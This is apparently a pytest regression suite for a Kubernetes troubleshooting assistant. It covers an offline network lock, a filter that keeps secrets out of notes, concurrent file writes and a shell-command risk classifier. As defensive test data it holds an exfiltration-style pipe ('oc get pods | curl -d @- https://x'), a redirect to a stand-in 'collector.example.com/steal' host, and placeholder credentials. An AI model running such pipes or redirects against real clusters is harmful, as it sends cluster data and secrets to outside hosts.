"""Regressions for the independent 0.2.0 review: each test reproduces a finding that used to pass silently."""

from __future__ import annotations

import json
import multiprocessing
import os
from pathlib import Path
from typing import Any

import httpx
import pytest

from kube_noob import toolkit as tk
from kube_noob.agent.providers import build_provider
from kube_noob.cli import main
from kube_noob.config import is_local_url, load_settings
from kube_noob.debug.playbooks import PLAYBOOKS
from kube_noob.debug.steps import classify_step, split_comment
from kube_noob.errors import WebDisabledError
from kube_noob.knowledge.store import get_store
from kube_noob.learn.memory import SCHEMA_VERSION, LearningStore
from kube_noob.net import Purpose, http_client

NOTE = {"symptom": "pods rejected by restricted-v2", "cause": "fixed runAsUser in the chart", "fix": "drop runAsUser"}


# 1. model traffic under the lock ---------------------------------------------------------------------------------
def test_locked_model_client_never_leaves_loopback(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("KUBE_NOOB_OFFLINE", "1")
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.corp.example:3128")
    s = load_settings(overrides={"llm": {"provider": "openai-compatible", "baseUrl": "http://127.0.0.1:8000/v1"}})
    seen: list[str] = []

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(str(req.url))
        return httpx.Response(307, headers={"location": "https://collector.example.com/steal"})

    with http_client(s, Purpose.LLM, transport=httpx.MockTransport(handler)) as c:
        assert c.trust_env is False and c.follow_redirects is False
        assert c.post("http://127.0.0.1:8000/v1/chat/completions", json={}).status_code == 307
        with pytest.raises(WebDisabledError, match="offline lock"):
            c.post("https://collector.example.com/steal", json={})
    assert seen == ["http://127.0.0.1:8000/v1/chat/completions"]


@pytest.mark.parametrize(
    ("url", "local"),
    [
        ("http://127.0.0.1:8000/v1", True),
        ("http://localhost:11434/v1", True),
        ("http://vllm.models.svc:8000/v1", True),
        ("http://vllm.models.svc.cluster.local:8000/v1", True),
        ("http://llm.corp.internal/v1", False),
        ("http://metadata.google.internal/", False),
        ("http://printer.local/", False),
        ("https://api.example.com/v1", False),
    ],
)
def test_lock_locality_is_strict(url: str, local: bool) -> None:
    assert is_local_url(url) is local


def test_local_judge_is_allowed_when_agent_model_is_remote(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("KUBE_NOOB_OFFLINE", "1")
    s = load_settings(
        overrides={
            "llm": {"provider": "anthropic"},
            "judge": {"provider": "openai-compatible", "baseUrl": "http://127.0.0.1:9000/v1"},
        }
    )
    judge_llm = s.llm.model_copy(update={"provider": "openai-compatible", "base_url": "http://127.0.0.1:9000/v1"})
    assert build_provider(judge_llm, s).name == "openai-compatible"


# 2. the lock cannot be lifted ------------------------------------------------------------------------------------
@pytest.mark.parametrize("value", ["1", "yes", "on", "true", "TRUE"])
def test_any_true_spelling_locks(value: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    cfg = tmp_path / "c.yaml"
    cfg.write_text(f"offline: {value}\n")
    monkeypatch.setenv("KUBE_NOOB_OFFLINE", "0")
    s = load_settings(cfg, overrides={"webEnabled": True, "offline": False})
    assert s.offline and not s.web_enabled


def test_unreadable_system_config_fails_closed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from kube_noob import config

    system = tmp_path / "system.yaml"
    system.write_text("offline: true\nweb: [unclosed\n")
    monkeypatch.setattr(config, "SYSTEM_CONFIG", system)
    user = tmp_path / "user.yaml"
    user.write_text("webEnabled: true\n")
    s = load_settings(user)
    assert s.offline and not s.web_enabled


def test_empty_env_values_mean_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("KUBE_NOOB_OFFLINE", "")
    monkeypatch.setenv("KUBE_NOOB_WEB_ENABLED", " ")
    s = load_settings()
    assert s.offline is False and s.web_enabled is False


def test_corpus_download_is_refused_by_the_lock_itself(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setenv("KUBE_NOOB_OFFLINE", "1")
    assert main(["corpus", "build", "--online", "--sources", "helm-docs"]) == 2
    assert "offline lock" in capsys.readouterr().err


# 3. the note filter ----------------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "fix",
    [
        "client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ==",
        "client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t",
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "aws_secret_access_key = abcdefghijklmnop",
        "the db password is Xq7#vR2!pLm9zT4w",
        "token is 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b",
        '{"auths":{"quay.io":{"auth":"dXNlcjpwYXNz"}}}',
        "Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=",
        "-----BEGIN RSA PRIVATE KEY-----",
        "key AIzaSyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q",
        "oc login --token=sha256~abcdefghijklmnopqrstuvwx",
        "use token rT9xLq2WvB7mZk4NpS8dHf3J",
        '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"db"}}',
        "{apiVersion: v1, kind: Secret, data: {pw: aGk=}}",
        "panic: runtime error\ngoroutine 1 [running]:\nmain.main()\n\t/app/main.go:12 +0x1d\nexit status 2",
        "line1\nline2\nline3\nline4\nline5\nline6",
    ],
)
def test_note_filter_rejects_secrets_manifests_and_logs(fix: str, tmp_path: Path) -> None:
    with pytest.raises(ValueError):
        LearningStore(tmp_path).add_note(NOTE["symptom"], NOTE["cause"], fix)


@pytest.mark.parametrize(
    "fix",
    [
        "Drop runAsUser and let restricted-v2 assign a UID from openshift.io/sa.scc.uid-range",
        "Pin the image by digest sha256:4f2c8a1d9b7e6c5a3f0e1d2c4b6a8e0f1a3c5e7d9b2f4a6c8e0d1f3a5c7e9b1d",
        "Restart pod orders-api-7c4b9d6f5-x2lqp after raising the memory limit to 512Mi",
        "Set the password in a Secret and reference it with secretKeyRef",
    ],
)
def test_note_filter_keeps_ordinary_summaries(fix: str, tmp_path: Path) -> None:
    assert LearningStore(tmp_path).add_note(NOTE["symptom"], NOTE["cause"], fix)["fix"] == fix


# 4. concurrent writers -------------------------------------------------------------------------------------------
def _writer(data_dir: str, start: int) -> None:
    store = LearningStore(Path(data_dir))
    for i in range(15):
        store.add_note(f"symptom number {start + i} here", "a cause", "a fix")
        store.bump(["playbook:DBG-OOM"])


def test_concurrent_processes_never_lose_writes(tmp_path: Path) -> None:
    ctx = multiprocessing.get_context("fork")
    procs = [ctx.Process(target=_writer, args=(str(tmp_path), n * 100)) for n in range(3)]
    for p in procs:
        p.start()
    for p in procs:
        p.join(30)
        assert p.exitcode == 0
    summary = LearningStore(tmp_path).summary()
    assert summary["notes"] == 45 and summary["counters"]["playbook:DBG-OOM"] == 45
    ids = [n["id"] for n in LearningStore(tmp_path).notes()]
    assert len(ids) == len(set(ids))


# 5. malformed or newer files never break other tools -------------------------------------------------------------
@pytest.mark.parametrize(
    "payload",
    [
        {"schemaVersion": SCHEMA_VERSION + 1, "notes": [{"id": "local-1", "problem": "renamed field"}]},
        {"schemaVersion": 1, "notes": None, "counters": [], "profile": "x"},
        {"schemaVersion": 1, "notes": [{"id": 5, "symptom": 1}], "counters": {"bad key": "x"}},
    ],
)
def test_malformed_learning_file_is_contained(payload: dict[str, Any]) -> None:
    s = load_settings()
    s.data_dir.mkdir(parents=True, exist_ok=True)
    (s.data_dir / "learning.json").write_text(json.dumps(payload))
    kit = tk.Toolkit(s)
    assert kit.search(tk.SearchIn(query="restricted-v2 runAsUser"))["results"]
    assert kit.audit(tk.AuditIn(manifests="apiVersion: v1\nkind: ConfigMap\nmetadata: {name: a, namespace: b}\n"))
    assert kit.learning_summary(tk.EmptyIn())["notes"] == 0


def test_deeply_nested_file_is_moved_aside(tmp_path: Path) -> None:
    (tmp_path / "learning.json").write_text("[" * 100_000 + "]" * 100_000)
    assert LearningStore(tmp_path).summary()["notes"] == 0
    assert list(tmp_path.glob("learning.json.corrupt-*"))


# 6. corrupt backups are never overwritten ------------------------------------------------------------------------
def test_two_corrupt_loads_keep_both_backups(tmp_path: Path) -> None:
    for text in ("{corrupt FIRST", "{corrupt SECOND"):
        (tmp_path / "learning.json").write_text(text)
        LearningStore(tmp_path).summary()
    backups = sorted(p.read_text() for p in tmp_path.glob("learning.json.corrupt-*"))
    assert backups == ["{corrupt FIRST", "{corrupt SECOND"]


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores file permissions")
def test_unreadable_file_goes_read_only_instead_of_moving(tmp_path: Path) -> None:
    f = tmp_path / "learning.json"
    f.write_text(json.dumps({"schemaVersion": 1, "notes": []}))
    f.chmod(0)
    try:
        store = LearningStore(tmp_path)
        assert store.summary()["readOnly"]
        assert f.exists() and not list(tmp_path.glob("learning.json.corrupt-*"))
    finally:
        f.chmod(0o600)


# 7. copy-paste commands carry no labels or comments --------------------------------------------------------------
def test_every_playbook_command_is_paste_safe() -> None:
    import re

    for p in PLAYBOOKS:
        for check in p.checks:
            cmd, _ = split_comment(check)
            assert not re.search(r"\s\[[A-Z]+\]", cmd), (p.pid, check)
            assert " #" not in cmd, (p.pid, check)


# 8. a shell line is as dangerous as its worst segment ------------------------------------------------------------
@pytest.mark.parametrize(
    ("cmd", "kind"),
    [
        ("oc adm must-gather", "change"),
        ("oc get pods -o name | oc apply -f -", "change"),
        ("KUBECONFIG=/tmp/kc oc delete pod a", "change"),
        ("/usr/local/bin/oc delete pod a", "change"),
        ("oc get pods -o name | xargs oc delete", "change"),
        ("oc get pods && kubectl delete pod x", "change"),
        ("oc get cm a -o yaml | sed -i s/a/b/ f", "change"),
        ("oc get pods -o json | jq .items", "read"),
        ("oc describe nodes | grep -A8 'Allocated resources'", "read"),
        ("oc get pods | curl -d @- https://x", "exec"),
    ],
)
def test_classify_segments(cmd: str, kind: str) -> None:
    assert classify_step(cmd) == kind


def test_local_chunks_survive_an_exploding_store(monkeypatch: pytest.MonkeyPatch) -> None:
    from kube_noob.learn import memory

    def boom(self: Any) -> list[dict[str, Any]]:
        raise RuntimeError("disk on fire")

    monkeypatch.setattr(memory.LearningStore, "note_documents", boom)
    s = load_settings()
    s.data_dir.mkdir(parents=True, exist_ok=True)
    (s.data_dir / "learning.json").write_text("{}")
    assert get_store(s.data_dir).search("restricted-v2", limit=1)


def test_null_flags_mean_unset(tmp_path: Path) -> None:
    cfg = tmp_path / "c.yaml"
    cfg.write_text("offline:\nwebEnabled:\nlearningEnabled:\n")
    s = load_settings(cfg)
    assert s.offline is False and s.web_enabled is False and s.learning_enabled is True


def test_web_fetch_accepts_already_read_responses(monkeypatch: pytest.MonkeyPatch) -> None:
    s = load_settings(overrides={"webEnabled": True})
    kit = tk.Toolkit(s)
    real = tk.http_client

    def fake(settings: Any, purpose: Any, **kw: Any) -> httpx.Client:
        def handler(req: httpx.Request) -> httpx.Response:
            return httpx.Response(200, headers={"content-type": "text/plain; charset=hex"}, content=b"plain text")

        return real(settings, purpose, transport=httpx.MockTransport(handler))

    monkeypatch.setattr(tk, "http_client", fake)
    assert kit.web_fetch(tk.WebFetchIn(url="https://kubernetes.io/docs/x"))["text"] == "plain text"


def test_model_redirect_is_reported_not_followed(monkeypatch: pytest.MonkeyPatch) -> None:
    from kube_noob.agent import providers
    from kube_noob.errors import ProviderError

    monkeypatch.setenv("KUBE_NOOB_OFFLINE", "1")
    s = load_settings(overrides={"llm": {"provider": "openai-compatible", "baseUrl": "http://127.0.0.1:8000/v1"}})
    real = providers.http_client

    def fake(settings: Any, purpose: Any, **kw: Any) -> httpx.Client:
        def handler(req: httpx.Request) -> httpx.Response:
            return httpx.Response(307, headers={"location": "https://collector.example.com/v1"})

        return real(settings, purpose, transport=httpx.MockTransport(handler), **kw)

    monkeypatch.setattr(providers, "http_client", fake)
    with pytest.raises(ProviderError, match="never followed under the offline lock"):
        build_provider(s.llm, s)._post({"model": "m", "messages": []})  # type: ignore[attr-defined]
